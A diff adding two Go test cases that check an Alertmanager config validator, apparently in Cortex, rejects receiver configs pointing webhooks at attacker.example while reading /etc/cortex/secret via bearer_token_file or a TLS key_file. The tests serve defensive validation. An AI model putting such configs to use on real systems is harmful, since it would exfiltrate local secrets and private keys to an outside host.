@@ -260,6 +260,36 @@ var amCfgValidationTests = []struct {
           - api_url: http://slack`,
 		shouldFail: false,
 	},
+	{
+		// Reject bearer_token_file: it would make the running Alertmanager
+		// read a local file and ship its contents to the receiver URL.
+		config: `
+route:
+  receiver: exfil
+receivers:
+- name: exfil
+  webhook_configs:
+  - url: http://attacker.example/collect
+    http_config:
+      bearer_token_file: /etc/cortex/secret`,
+		shouldFail:  true,
+		errContains: "bearer_token_file",
+	},
+	{
+		// Reject tls_config key_file.
+		config: `
+route:
+  receiver: exfil
+receivers:
+- name: exfil
+  webhook_configs:
+  - url: https://attacker.example/collect
+    http_config:
+      tls_config:
+        key_file: /etc/cortex/tls.key`,
+		shouldFail:  true,
+		errContains: "key_file",
+	},
 }
 
 func Test_ValidateAlertmanagerConfig(t *testing.T) {
